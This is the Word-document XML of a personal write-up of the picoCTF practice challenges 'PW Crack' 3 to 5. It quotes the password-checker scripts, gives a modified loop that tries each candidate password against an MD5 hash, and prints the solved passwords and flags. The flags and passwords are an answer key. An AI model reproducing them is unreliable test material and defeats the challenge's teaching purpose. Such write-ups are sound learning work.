          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(decryption)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46EFD4B6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79C03230" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("That password is incorrect")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D52671A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D4A4077" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6497DDE9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="312914D4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>level_3_pw_check()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1010D30C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="707D3884" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EEE12E5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"># The strings below are 7 possibilities for the correct password. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E57A73E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>#   (Only 1 is correct)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63B7DD5F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>pos_pw_list</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> = ["f09e", "4dcf", "87ab", "dba8", "752e", "3961", "f159"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FB47C46" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A105F72" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">md5 hash is </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>caro@ubuntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>:~/Downloads$ python3 level3.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="112A8656" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Please enter correct password for flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>dba8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="277056A1" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Welcome back... your flag, user:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB8199C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>{m45h_fl1ng1ng_cd6ed2eb}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BB3537" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28F533A8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>PW Crack 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61CB821B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574B357D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B4FDF50" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>syreal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4236F746" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51B911F8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Can you crack the password to get the flag? Download the password checker </w:t>
      </w:r>
      <w:hyperlink r:id="rId29" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>here</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and you'll need the encrypted </w:t>
      </w:r>
      <w:hyperlink r:id="rId30" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>flag</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and the </w:t>
      </w:r>
      <w:hyperlink r:id="rId31" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>hash</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> in the same directory too. There are 100 potential passwords with only 1 being correct. You can find these by examining the password checker script.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F33341" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64022E7C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>flag_enc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = open('level4.flag.txt.enc', '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>rb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>').read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42BE3E23" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>correct_pw_hash</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = open('level4.hash.bin', '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>rb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>').read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17629E8F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D697F42" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1343E05E"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2E034460"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4E62E2A0"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429D0677" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    m = hashlib.md5()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D0DE41D"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38F5010E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    return </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>m.digest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A364BBB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00041004" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36E71D14" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pos_pw_list</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = ["8c86", "7692", "a519", "3e61", "7dd6", "8919", "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>aaea</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>", "f34b", "d9a2", "39f7", "626b", "dc78", "2a98", "7a85", "cd15", "80fa", "8571", "2f8a", "2ca6", "7e6b", "9c52", "7423", "a42c", "7da0", "95ab", "7de8", "6537", "ba1e", "4fd4", "20a0", "8a28", "2801", "2c9a", "4eb1", "22a5", "c07b", "1f39", "72bd", "97e9", "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>affc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>", "4e41", "d039", "5d30", "d13f", "c264", "c8be", "2221", "37ea", "ca5f", "fa6b", "5ada", "607a", "e469", "5681", "e0a4", "60aa", "d8f8", "8f35", "9474", "be73", "ef80", "ea43", "9f9e", "77d7", "d766", "55a0", "dc2d", "a970", "df5d", "e747", "dc69", "cc89", "e59a", "4f68", "14ff", "7928", "36b9", "eac6", "5c87", "da48", "5c1d", "9f63", "8b30", "5534", "2434", "4a82", "d72c", "9b6b", "73c5", "1bcf", "c739", "6c31", "e138", "9e77", "ace1", "2ede", "32e0", "3694", "fc92", "a7e2"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5367E0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29C4DB63" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="002124BC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="128AE384" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="754700AA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>def level_4_pw_check():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FF16D6E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    #user_pw = input("Please enter correct password for flag: ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BFFE1C4"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 xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1284D6A6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>user_pw_hash</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>hash_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>user_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D2B6BDC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">        if( </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>user_pw_hash</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> == </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>correct_pw_hash</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> ):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D58A52" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:tab/>
        <w:t># print("Welcome back... your flag, user:")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C285CDA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">            print(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>user_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="337F1B12"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2E3E4F64" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            print(decryption)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27787E9B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549DBA87" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>#print("That password is incorrect")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4209AC0D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="081A54DB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7535F8C6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>level_4_pw_check()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3295AC02" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32F487BE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>caro@ubuntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>:~/Downloads$ python3 level4.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0854A5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>607a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CA428DD" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>{fl45h_5pr1ng1ng_d770d48c}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20C087D8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15282FFB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>PW Crack 5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41C560BD" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C1D011C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC06FD5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>syreal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="648EFDFE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB2DB47" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Can you crack the password to get the flag? Download the password checker </w:t>
      </w:r>
      <w:hyperlink r:id="rId32" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>here</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and you'll need the encrypted </w:t>
      </w:r>
      <w:hyperlink r:id="rId33" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>flag</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and the </w:t>
      </w:r>
      <w:hyperlink r:id="rId34" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>hash</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> in the same directory too. Here's a </w:t>
      </w:r>
      <w:hyperlink r:id="rId35" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>dictionary</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> with all possible passwords based on the password conventions we've seen so far.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5493231C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BB6CDBA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>caro@ubuntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>:~/Downloads$ python3 level5.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EFF2945" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{h45h_sl1ng1ng_36e992a6}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DDF0798" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>9581</w:t>
      </w:r>
